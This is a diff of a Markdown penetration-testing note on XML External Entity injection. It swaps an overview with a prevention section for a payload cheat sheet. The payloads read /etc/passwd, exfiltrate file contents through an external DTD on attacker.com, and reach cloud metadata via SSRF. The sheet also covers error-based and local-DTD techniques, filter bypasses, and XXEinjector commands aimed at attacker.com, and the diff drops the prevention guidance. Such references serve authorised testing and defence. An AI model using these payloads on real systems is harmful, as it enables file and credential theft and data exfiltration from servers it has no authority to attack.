@@ -1,57 +1,107 @@
-# XML External Entities (XXE)
+# XXE: XML External Entity Injection
 
-XXE attacks exploit XML external entity processing to read files, perform SSRF, or cause DoS.
+## Detection Methodology
 
-## Basic XXE Payloads
+Test every endpoint that accepts XML or can be switched to XML via Content-Type:
 
-### File Reading
 ```xml
+<!-- Basic probe -->
 <?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]>
+<root>&test;</root>
+
+<!-- Blind XXE probe (OOB) -->
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://collaborator.oastify.com/"> %xxe;]>
+<root/>
+```
+
+## Exploitation Techniques
+
+### In-Band File Read
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<root>&xxe;</root>
+<data>&xxe;</data>
 ```
 
-### SSRF via XXE
+### Blind XXE via External DTD
+Host `evil.dtd` on attacker server:
 ```xml
-<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
+%eval;
+%exfil;
+```
+
+Victim payload:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<r/>
+```
+
+### XXE → SSRF (Cloud Metadata)
+```xml
+<!DOCTYPE r [
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
+<r>&xxe;</r>
 ```
 
-### Blind XXE (Out-of-band)
+### Error-Based XXE (No OOB, No Reflection)
 ```xml
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker.com/collect">
-  %xxe;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+## Bypass Techniques
+
+### Parameter Entity Bypass
+When `&` is filtered, use parameter entities (`%`) instead:
+```xml
+<!DOCTYPE root [
+  <!ENTITY % param1 SYSTEM "file:///etc/passwd">
+  %param1;
 ]>
 ```
 
-## XXE in Different Contexts
-- **SVG Upload** - XXE in SVG XML metadata
-- **SOAP/XML-RPC** - XXE in SOAP body
-- **XLSX/DOCX** - Office docs are ZIP + XML, modify sharedStrings.xml
-- **PDF (FDF)** - Some PDF generators accept XML form data
-
-## Blind XXE Detection
-Use external callback services: Burp Collaborator, Interactsh, webhook.site
-
-## Prevention
-1. Disable XML external entity processing
-2. Use JSON instead of XML where possible
-3. Disable DTD processing entirely
-4. Update XML libraries (many had default XXE)
-
-```python
-# Python lxml
-parser = etree.XMLParser(resolve_entities=False, no_network=True)
-
-# Java
-DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
-dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+### UTF-7 Encoding
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
 ```
 
----
+### Local DTD Repurposing
+When no external access is available, use local DTD files:
+```xml
+<!DOCTYPE r [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso "
+    <!ENTITY % file SYSTEM 'file:///etc/passwd'>
+    <!ENTITY % eval '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/%file;">'>
+    %eval;
+    %error;
+  ">
+  %local_dtd;
+]>
+```
 
-> **Next**: [Command Injection](13-command-injection.md)
+## Tooling
+
+```bash
+# XXEinjector - automated blind XXE
+ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --path=/uploads
+# oxml_xxe - Office format XXE injection
+python oxml_xxe.py -f document.docx --xxe "file:///etc/passwd"
+```
